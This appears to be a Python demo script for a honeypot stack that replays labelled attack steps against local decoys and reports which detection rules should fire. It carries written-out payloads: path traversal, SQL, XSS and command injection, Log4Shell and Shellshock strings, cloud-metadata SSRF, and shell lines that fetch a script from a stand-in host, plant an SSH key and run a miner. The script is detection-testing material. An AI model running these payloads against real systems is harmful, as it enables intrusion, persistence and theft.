#!/usr/bin/env python3
"""Labelled, harmless attack steps against a locally running QLure stack.

For each step this prints its label, what it sent, the decoy's short reply and the rules a
reviewer should expect. Every request is a fixed string. The decoys run nothing, so the shell
commands below are only text the fake shell records. Targets other than the loopback addresses
are refused, and no step contacts any other host.

    python tools/demo_scenario.py --list
    python tools/demo_scenario.py --dry-run
    python tools/demo_scenario.py                       # every step against 127.0.0.1
    python tools/demo_scenario.py --only api-key-reuse
    python tools/demo_scenario.py --no-proxy-header     # when the gateway adds PROXY itself

Exit codes: 0 all selected steps ran, 1 at least one step could not reach its decoy,
2 refused target or bad arguments.
"""

from __future__ import annotations

import argparse
import asyncio
import functools
import hashlib
import ipaddress
import socket
import sys
from collections.abc import Callable, Sequence
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import asyncssh
import httpx
import yaml

REPO = Path(__file__).resolve().parent.parent
HONEYTOKEN_FILE = REPO / "decoys" / "honeytokens.yaml"
RULES_FILE = REPO / "qlure" / "rules" / "rules.yaml"

LOCAL_TARGETS = ("127.0.0.1", "::1", "localhost")
DEFAULT_TARGET = "127.0.0.1"
PORTS = {"web": 8080, "api": 8081, "ssh": 2222, "ftp": 2121, "mysql": 3306, "redis": 6379}
# Raw TCP decoys read a PROXY v1 line before any protocol bytes. HTTP ports never take one.
PROXY_SERVICES = frozenset({"ssh", "ftp", "mysql", "redis"})
SOURCE_NET = ipaddress.ip_network("198.51.100.0/24")  # RFC 5737 documentation range
DEFAULT_SOURCE = "198.51.100.23"
SOURCE_PORT = 40404
BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
TIMEOUT = 3.0
SSH_TIMEOUT = 15.0
LINE_LIMIT = 512
MYSQL_LIMIT = 4096
SHOWN_LIMIT = 100
DASHBOARD_HINT = (
    "http://127.0.0.1:9000 (docker compose), or http://127.0.0.1:9100 if you started "
    "the dashboard with uvicorn as in docs/DEMO.md"
)


# Fixed inputs. Planted secrets come from decoys/honeytokens.yaml, never from this file.


@functools.cache
def _yaml(path: Path) -> Any:
    return yaml.safe_load(path.read_text(encoding="utf-8"))


@functools.cache
def planted(token_id: str) -> dict[str, Any]:
    """One planted secret from decoys/honeytokens.yaml."""
    for token in _yaml(HONEYTOKEN_FILE)["honeytokens"]:
        if token["id"] == token_id:
            return token
    raise ValueError(f"no honeytoken {token_id!r} in {HONEYTOKEN_FILE.name}")


@functools.cache
def default_credentials() -> tuple[tuple[str, str], ...]:
    pairs = _yaml(RULES_FILE)["lists"]["default_credentials"]
    return tuple((str(user), str(password)) for user, password in pairs)


@functools.cache
def rule_table() -> dict[str, Any]:
    return _yaml(RULES_FILE)


WEB_SCAN_PATHS = (
    "/wp-login.php",
    "/phpmyadmin/",
    "/.env",
    "/.git/config",
    "/xmlrpc.php",
    "/admin.php",
    "/vendor/phpunit",
    "/.aws",
    "/server-status",
)
TRAVERSAL_PATHS = (
    "/download?file=../../../../etc/passwd",
    "/download?file=..%2f..%2f..%2fetc%2fshadow",
    "/?page=php://filter/convert.base64-encode/resource=/etc/passwd",
)
INJECTION_PATHS = (
    "/?id=1' OR '1'='1",
    "/search?q=<script>alert(1)</script>",
    "/ping?host=127.0.0.1;id",
)
BRUTE_PASSWORDS = ("admin123", "letmein123", "Summer2026", "qwerty123", "P@ssw0rd", "changeme99")
DEFAULT_CREDENTIAL_TRIES = 4
SCANNER_AGENTS = (
    "sqlmap/1.8#stable (https://sqlmap.org)",
    "Nikto/2.5.0",
    "Nmap Scripting Engine (https://nmap.org/book/nse.html)",
)
WRONG_API_KEYS = tuple(f"qlk_decoy_guess_{n:02d}" for n in range(1, 6))
SSH_COMMANDS = (
    "whoami",
    "id",
    "uname -a",
    "hostname",
    "ls -la ~",
    "cat ~/.bash_history",
    "wget -q http://198.51.100.99/update.sh -O update.sh",
    "echo 'ssh-ed25519 AAAAC3DECOYNOTAKEY demo@decoy' >> ~/.ssh/authorized_keys",
    "crontab -l",
    "./xmrig --donate-level 0 -o stratum+tcp://127.0.0.1:1 -u DECOY",
)
FTP_ATTEMPTS = (("admin", "admin"), ("root", "toor"), ("ftp", "ftp"))


# Step model


@dataclass
class Context:
    """Where the steps send traffic. Tests override ports; the CLI keeps the defaults."""

    host: str = DEFAULT_TARGET
    ports: dict[str, int] = field(default_factory=lambda: dict(PORTS))
    proxy: bool = True
    source_ip: str = DEFAULT_SOURCE

    def base_url(self, service: str) -> str:
        return f"http://{_hostport(self.host, self.ports[service])}"


@dataclass
class Outcome:
    """What one step sent and what came back, one entry per request."""

    sent: list[str] = field(default_factory=list)
    replies: list[str] = field(default_factory=list)
    error: str | None = None

    def record(self, sent: str, reply: str) -> None:
        self.sent.append(sent)
        self.replies.append(reply)


Runner = Callable[[Context, Outcome], None]


@dataclass(frozen=True)
class Step:
    id: str
    title: str
    rules: tuple[str, ...]
    run: Runner
    note: str = ""


STEPS: list[Step] = []


def step(
    step_id: str, title: str, rules: tuple[str, ...], note: str = ""
) -> Callable[[Runner], Runner]:
    """Register a step. Registration order is the order the demo runs them."""

    def register(fn: Runner) -> Runner:
        STEPS.append(Step(step_id, title, rules, fn, note))
        return fn

    return register


def _hostport(host: str, port: int) -> str:
    return f"[{host}]:{port}" if ":" in host else f"{host}:{port}"


def is_local(target: str) -> bool:
    return target.strip().lower() in LOCAL_TARGETS


def proxy_line(source_ip: str, dst_port: int) -> bytes:
    """A PROXY v1 line as the gateway writes it: the visitor's documentation-range address."""
    return f"PROXY TCP4 {source_ip} 127.0.0.1 {SOURCE_PORT} {dst_port}\r\n".encode("ascii")


def _open(ctx: Context, service: str) -> socket.socket:
    """A connected socket. Raw TCP decoys get the PROXY line first when the option is on."""
    port = ctx.ports[service]
    sock = socket.create_connection((ctx.host, port), timeout=TIMEOUT)
    if ctx.proxy and service in PROXY_SERVICES:
        sock.sendall(proxy_line(ctx.source_ip, port))
    return sock


def _http(ctx: Context, service: str) -> httpx.Client:
    # The web and API decoys sit behind nginx, which sets X-Forwarded-For; direct requests
    # carry the same header so every step reads as one visitor.
    return httpx.Client(
        base_url=ctx.base_url(service),
        timeout=TIMEOUT,
        follow_redirects=False,
        trust_env=False,  # an HTTP(S)_PROXY variable in the shell must never catch this traffic
        headers={
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,*/*",
            "X-Forwarded-For": ctx.source_ip,
        },
    )


def _send(
    out: Outcome,
    client: httpx.Client,
    method: str,
    path: str,
    *,
    shown: str | None = None,
    **kwargs: Any,
) -> None:
    resp = client.request(method, path, **kwargs)
    out.record(shown or f"{method} {path}", f"HTTP {resp.status_code}")


def _line(reader: Any) -> str:
    return reader.readline(LINE_LIMIT).decode("ascii", errors="replace").strip()


def _resp(*args: str) -> bytes:
    """One Redis command as a RESP array of bulk strings."""
    parts = [f"*{len(args)}\r\n".encode("ascii")]
    for arg in args:
        raw = arg.encode("utf-8")
        parts.append(f"${len(raw)}\r\n".encode("ascii") + raw + b"\r\n")
    return b"".join(parts)


def _mysql_packet(reader: Any) -> bytes:
    header = reader.read(4)
    if len(header) < 4:
        raise ValueError("short MySQL packet header")
    size = int.from_bytes(header[:3], "little")
    if size > MYSQL_LIMIT:
        raise ValueError("MySQL packet larger than the demo allows")
    return reader.read(size)


def _mysql_salt(greeting: bytes) -> bytes:
    """The 20-byte scramble inside the server's greeting (protocol 10, MySQL 8.0 layout)."""
    start = greeting.index(b"\x00", 1) + 5  # past the version's NUL and the connection id
    return greeting[start : start + 8] + greeting[start + 27 : start + 39]


def _mysql_token(password: str, salt: bytes) -> bytes:
    """The mysql_native_password response: SHA1(pw) XOR SHA1(salt + SHA1(SHA1(pw)))."""

    def sha1(data: bytes) -> bytes:
        return hashlib.sha1(data, usedforsecurity=False).digest()

    stage1 = sha1(password.encode("utf-8"))
    mask = sha1(salt + sha1(stage1))
    return bytes(a ^ b for a, b in zip(stage1, mask, strict=True))


def _mysql_login_packet(user: str, token: bytes) -> bytes:
    """A HandshakeResponse41. Capabilities: PROTOCOL_41 | SECURE_CONNECTION | PLUGIN_AUTH;
    charset 33; max packet 16 MB; sequence 1."""
    body = (
        (0x00088200).to_bytes(4, "little")
        + (1 << 24).to_bytes(4, "little")
        + bytes([33])
        + b"\x00" * 23
        + user.encode("ascii")
        + b"\x00"
        + bytes([len(token)])
        + token
    )
    return len(body).to_bytes(3, "little") + bytes([1]) + body


def _mysql_error(payload: bytes) -> str:
    if payload[:1] != b"\xff":
        return f"packet starting 0x{payload[:1].hex()}"
    code = int.from_bytes(payload[1:3], "little")
    return f"ERR {code} {payload[9:].decode('ascii', errors='replace')}"


# Web and API steps


@step("web-scan", "Recon: probe common attack paths on the web decoy", ("R2",))
def web_scan(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for path in WEB_SCAN_PATHS:
            _send(out, web, "GET", path)


@step("web-hunt", "Hunt for leaked files: /.env and the /backup folder", ("R9",))
def web_hunt(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for path in ("/.env", "/backup/", "/backup/config.bak"):
            _send(out, web, "GET", path)


@step("web-lfi", "Path traversal and LFI wrappers on /download and /", ("R5", "R9"))
def web_lfi(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for path in TRAVERSAL_PATHS:
            _send(out, web, "GET", path)


@step(
    "web-injection",
    "SQL injection, XSS and command injection strings on the web page",
    ("R5",),
)
def web_injection(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for path in INJECTION_PATHS:
            _send(out, web, "GET", path)


@step(
    "web-exploit-strings",
    "Log4Shell, Shellshock, SSRF and web shell strings",
    ("R5",),
    note="Fixed strings only; nothing is fetched or executed by the decoy.",
)
def web_exploit_strings(ctx: Context, out: Outcome) -> None:
    log4shell = "${jndi:ldap://198.51.100.99:1389/demo}"
    shellshock = "() { :; }; echo shellshock-demo"
    with _http(ctx, "web") as web:
        for agent in (log4shell, shellshock):
            _send(
                out,
                web,
                "GET",
                "/",
                shown=f"GET /  User-Agent: {agent}",
                headers={"User-Agent": agent},
            )
        _send(out, web, "GET", "/?url=http://169.254.169.254/latest/meta-data/")
        _send(out, web, "GET", "/uploads/cmd.php?c=whoami")


@step(
    "web-login",
    "Login brute force and default credentials on /login",
    ("R3", "R4"),
)
def web_login(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for password in BRUTE_PASSWORDS:
            _send(
                out,
                web,
                "POST",
                "/login",
                shown=f"POST /login  ops / {password}",
                data={"username": "ops", "password": password},
            )
        for user, password in default_credentials()[:DEFAULT_CREDENTIAL_TRIES]:
            _send(
                out,
                web,
                "POST",
                "/login",
                shown=f"POST /login  {user} / {password}",
                data={"username": user, "password": password},
            )


@step("web-phpmyadmin", "phpMyAdmin probe on the common admin paths", ("R2",))
def web_phpmyadmin(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        _send(out, web, "GET", "/phpmyadmin/")
        _send(out, web, "GET", "/pma/")
        _send(
            out,
            web,
            "POST",
            "/phpmyadmin/index.php",
            data={"pma_username": "root", "pma_password": "root"},
        )


@step("web-scanner-ua", "Scanner user agents on the same page", ("R6",))
def web_scanner_ua(ctx: Context, out: Outcome) -> None:
    with _http(ctx, "web") as web:
        for agent in SCANNER_AGENTS:
            _send(
                out,
                web,
                "GET",
                "/",
                shown=f"GET /  User-Agent: {agent}",
                headers={"User-Agent": agent},
            )


@step(
    "api-key-reuse",
    "API key brute force, then reuse of the planted API key",
    ("R3", "R7"),
    note="Five wrong keys reach R3's failed-login threshold; the planted key is R7.",
)
def api_key_reuse(ctx: Context, out: Outcome) -> None:
    key = str(planted("ht-api-001")["value"])
    with _http(ctx, "api") as api:
        for guess in WRONG_API_KEYS:
            _send(
                out,
                api,
                "GET",
                "/api/v1/users",
                shown=f"GET /api/v1/users  X-API-Key: {guess}",
                headers={"X-API-Key": guess},
            )
        _send(
            out,
            api,
            "GET",
            "/api/v1/users",
            shown="GET /api/v1/users  X-API-Key: <planted ht-api-001>",
            headers={"X-API-Key": key},
        )


# Raw TCP steps


async def _ssh_session(ctx: Context, out: Outcome) -> None:
    token = planted("ht-ssh-001")
    username, password = str(token["username"]), str(token["value"])
    sock = _open(ctx, "ssh")
    sock.setblocking(False)  # asyncssh drives the socket itself
    async with await asyncssh.connect(
        ctx.host,
        port=ctx.ports["ssh"],
        sock=sock,
        username=username,
        password=password,
        known_hosts=None,
        client_keys=None,
        agent_path=None,
        preferred_auth=["password"],
        login_timeout=SSH_TIMEOUT,
    ) as conn:
        out.record(f"SSH login as {username} (password <planted ht-ssh-001>)", "login accepted")
        for command in SSH_COMMANDS:
            result = await asyncio.wait_for(conn.run(command, check=False), TIMEOUT * 2)
            text = str(result.stdout or result.stderr or "").strip()
            out.record(command, text.splitlines()[0] if text else "(no output)")


@step(
    "ssh-login",
    "SSH login with the planted deploy password, then discovery and persistence",
    ("R7", "R8", "R9"),
    note="Commands are typed text; the decoy shell executes nothing. R9: the bash_history read.",
)
def ssh_login(ctx: Context, out: Outcome) -> None:
    asyncio.run(asyncio.wait_for(_ssh_session(ctx, out), SSH_TIMEOUT * 3))


@step(
    "ftp-login",
    "FTP USER and PASS attempts on the FTP banner decoy",
    ("R3", "R4"),
    note="Three usernames reach R3. admin/admin and root/toor are default pairs (R4). "
    "Scoring of FTP logins is roadmap P1.4.",
)
def ftp_login(ctx: Context, out: Outcome) -> None:
    for user, password in FTP_ATTEMPTS:
        with _open(ctx, "ftp") as sock, sock.makefile("rb") as reader:
            out.record("connect", _line(reader))
            for line in (f"USER {user}", f"PASS {password}", "QUIT"):
                sock.sendall(line.encode("ascii") + b"\r\n")
                out.record(line, _line(reader))


@step(
    "mysql-probe",
    "MySQL handshake with the default root password from the rules list",
    ("R4",),
    note="The decoy recognises the default pair by its scramble response, as a real login would.",
)
def mysql_probe(ctx: Context, out: Outcome) -> None:
    password = next(pw for user, pw in default_credentials() if user == "root")
    with _open(ctx, "mysql") as sock, sock.makefile("rb") as reader:
        salt = _mysql_salt(_mysql_packet(reader))
        out.record("connect, read the server greeting", "greeting received")
        sock.sendall(_mysql_login_packet("root", _mysql_token(password, salt)))
        reply = _mysql_error(_mysql_packet(reader))
        out.record(f"handshake as root, default password {password!r}", reply)


@step(
    "redis-auth",
    "Redis AUTH with the planted password, then CONFIG SET and MODULE LOAD",
    ("R7", "R11"),
    note="CONFIG SET and MODULE LOAD are logged and answered with fixed replies; nothing loads.",
)
def redis_auth(ctx: Context, out: Outcome) -> None:
    secret = str(planted("ht-redis-001")["value"])
    commands = (
        ("AUTH <planted ht-redis-001>", ("AUTH", secret)),
        ("CONFIG SET dir /var/lib/redis", ("CONFIG", "SET", "dir", "/var/lib/redis")),
        ("MODULE LOAD /var/lib/redis/demo.so", ("MODULE", "LOAD", "/var/lib/redis/demo.so")),
    )
    with _open(ctx, "redis") as sock, sock.makefile("rb") as reader:
        for shown, args in commands:
            sock.sendall(_resp(*args))
            out.record(shown, _line(reader))


# Running and reporting


def run_step(ctx: Context, item: Step) -> Outcome:
    out = Outcome()
    try:
        item.run(ctx, out)
    except (OSError, httpx.HTTPError, asyncssh.Error, ValueError) as exc:
        out.error = f"{type(exc).__name__}: {exc}" if str(exc) else type(exc).__name__
    return out


def expected_verdict(rule_ids: Sequence[str]) -> str:
    """Verdict from the summed rule weights alone. Suppressors and actor links are not applied,
    so `qlure correlate` has the final word."""
    table = rule_table()
    score = sum(int(table["rules"][rule_id]["weight"]) for rule_id in rule_ids)
    if score >= table["verdicts"]["noteworthy"]:
        return "Noteworthy"
    if score >= table["verdicts"]["suspicious"]:
        return "Suspicious"
    return "Benign"


def _ascii(text: str) -> str:
    """Keep the output printable on every console, including Windows code pages."""
    return " ".join(text.split()).encode("ascii", "backslashreplace").decode("ascii")


def _clip(text: str) -> str:
    text = _ascii(text)
    return text if len(text) <= SHOWN_LIMIT else text[: SHOWN_LIMIT - 3] + "..."


def _rule_text(rule_ids: Sequence[str]) -> str:
    table = rule_table()["rules"]
    return ", ".join(f"{rid} {table[rid]['name']}" for rid in rule_ids)


def render_step(item: Step, out: Outcome) -> None:
    print(f"\n[{item.id}] {item.title}")
    for sent, reply in zip(out.sent, out.replies, strict=True):
        print(f"  > {_clip(sent)}")
        print(f"    < {_clip(reply)}")
    if out.error:
        print(f"  ! {_clip(out.error)}")
    print(f"  expect: {_rule_text(item.rules)}  (verdict about {expected_verdict(item.rules)})")
    if item.note:
        print(f"  note:   {_clip(item.note)}")


def render_summary(results: Sequence[tuple[Step, Outcome]]) -> None:
    print("\nSummary")
    print(f"  {'step':<20} {'status':<8} {'reqs':>4}  {'expect':<12} verdict")
    for item, out in results:
        status = "error" if out.error else "ok"
        rules = ",".join(item.rules)
        print(
            f"  {item.id:<20} {status:<8} {len(out.sent):>4}  {rules:<12} "
            f"{expected_verdict(item.rules)}"
        )


def render_followups() -> None:
    print("\nFollow-up commands (run from the repo root):")
    print("  qlure forward --logs logs --db data/qlure.db")
    print("  qlure correlate --db data/qlure.db --top 20")
    print("  qlure verify --logs logs --db data/qlure.db --pub data/signing.pub")
    print(f"\nDashboard: {DASHBOARD_HINT}")


def render_list(items: Sequence[Step]) -> None:
    for item in items:
        print(f"  {item.id:<20} {','.join(item.rules):<10} {item.title}")


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Send labelled, harmless attack steps to a local QLure stack.",
    )
    parser.add_argument(
        "--target", default=DEFAULT_TARGET, help="loopback only (default: %(default)s)"
    )
    parser.add_argument("--only", metavar="STEP_ID", help="run one step (see --list)")
    parser.add_argument("--list", action="store_true", help="list the steps and exit")
    parser.add_argument(
        "--dry-run", action="store_true", help="list the steps for this target; send nothing"
    )
    parser.add_argument(
        "--proxy-header",
        action=argparse.BooleanOptionalAction,
        default=True,
        help="send a PROXY v1 line to the raw TCP ports (ssh, ftp, mysql, redis). Turn it off "
        "when the nginx gateway is in front, since the gateway adds the line itself.",
    )
    parser.add_argument(
        "--source-ip",
        default=DEFAULT_SOURCE,
        help="documentation-range address every step appears to come from (198.51.100.0/24)",
    )
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = _parser().parse_args(argv)
    if args.list:
        render_list(STEPS)
        return 0
    if not is_local(args.target):
        print(
            f"refused: target {args.target!r} is not a loopback address. "
            "Use 127.0.0.1, ::1 or localhost.",
            file=sys.stderr,
        )
        return 2
    try:
        source = ipaddress.ip_address(args.source_ip)
    except ValueError:
        source = None
    if source is None or source not in SOURCE_NET:
        print(f"refused: --source-ip must be in {SOURCE_NET}", file=sys.stderr)
        return 2
    selected = [item for item in STEPS if args.only in (None, item.id)]
    if not selected:
        known = ", ".join(item.id for item in STEPS)
        print(f"unknown step {args.only!r}. Known steps: {known}", file=sys.stderr)
        return 2

    ctx = Context(
        host=args.target.strip().lower(), proxy=args.proxy_header, source_ip=args.source_ip
    )
    proxy_text = "on for raw TCP ports" if ctx.proxy else "off"
    print(
        f"QLure demo scenario: target {ctx.host}, PROXY header {proxy_text}, "
        f"visitor {ctx.source_ip}"
    )
    if args.dry_run:
        print("dry run: nothing was sent. Steps that would run:")
        render_list(selected)
        return 0

    results: list[tuple[Step, Outcome]] = []
    for item in selected:
        out = run_step(ctx, item)
        render_step(item, out)
        results.append((item, out))
    render_summary(results)
    render_followups()
    return 1 if any(out.error for _, out in results) else 0


if __name__ == "__main__":
    sys.exit(main())
